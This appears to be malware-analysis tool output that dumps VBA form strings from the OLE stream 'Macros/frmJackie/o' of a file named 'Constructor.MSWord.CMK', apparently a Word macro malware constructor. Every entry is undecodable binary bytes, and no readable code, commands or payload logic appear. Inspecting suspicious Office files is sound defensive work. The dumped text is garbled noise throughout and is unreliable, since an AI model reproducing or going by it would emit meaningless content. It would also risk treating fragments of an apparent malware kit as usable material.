VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v����;TP{Y}�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ß����7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�z�c��`��;��`7e�����<_�4����АַYx��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���DV�*�����S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�ј�QEzg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
}��O}$��m�̳s��=3�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�n�3�؁�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B���-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�аb$�p�}���A#�OQ�Xɾ~U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E{�̣uq%�̓�r��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��**(����ɻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,lQІV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F<�(����c�^=3ϊ��/����h�!�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#ұ�~�5����~�LǢ��YG$&��3[���NZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�׭
�2Ob
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��W���b�Z{��H�uW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�\^�fo�KkQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-d
O��'�D��O=̬a���1��d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��"��d�����#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���zֺf�=�$<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��8
Hϩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��Z:֪ڭ�eްD6Į�`=I�O��gW]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��ݜ�d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*���)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r=�FG����O"�O�P̤�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�+K���(�m*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ּ��[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i3�I�q���ן���^E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=&��K�H-�+q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e	�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b����$��oBO�*�?'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ro�g62W���;[+��ҡ�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�.B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�#��ԟ�g��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ke�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�N��d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,��I �܆�a��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v��=NU�n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NjkS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Z�:v�=�]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)$�S��;0��Պ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��W�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�3���%����JV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z^�a,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HH�Ϲ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ֆ�,�>$��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2��$�³Mg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m��R�+�%�QE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ץ���Jϫ����g��-��JT?�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B���ַSY�&����A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#����m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�("��֣�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��{fR�*A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t4�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���.�U�;K���HBGp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�aӯ�+��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{���9DA�?^rO�O�aW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

K���6�BU_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f���k��eR���2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M��ᶊ.?�������N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Etw�pD��s�k�r�3�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E݌
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�q�������=�֟���YƝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H]�j(����:�	�y�.�bp]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7�Et�,��i�M��*�ꬮ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�c�P�����N�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��1j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ll����s�������J1����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8X��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�$~@W/]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c#ď&>I"B�t8P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~'���
�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ٌ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��ń�i�[�*y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?���V���MĊr�ge�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]B�+�xI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?���<L6��L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��5髯Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_4�")�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@�ۨ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z[�*�R��D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ps�GQ����&�.tc�R:w��=*�XUw�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�r\ߎ�p���7�=�fI#�#I#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�&�u	���ܺI�9M�r�����QW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���JM�_п�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h��'v'��?�!TM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��(���B�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BGCk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��QT*����ZF#��dE衸
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�'{��[2�(���#�=d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'v>�0��^}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�r�l�H�&U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����][s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��犥����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�>_��Nuq{��٭��d�ܿ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܟ�{�mُ	s	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.�W:ެzꗟ���Ɠ�gU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��%��>x��,?�5!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ip��N	?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U�L�����x���ȧl��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���4lj�������o񦽪��n�fz~����rCj	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I&2d8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����>��J	ؠ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��o>�v?֕�G���V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�#^K�*�NS��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�lz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4/�]&E�K\B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�|����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=p��GW`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

{��#�\�ҳ�T�$m�}r�եc�j&���q+}\�����Q�"�k��	�^�*�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�a�+v�?�	?�ȥc��6�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�01s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9oȁX~c��:77���]>�����9��Eb�i:�1-�ݒy$������u�B�gz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7����SFO�]�M�]:6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]ߖ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S��2*�h��w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����m��ԭ��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qʬ��
-------------------------------------------------------------------------------
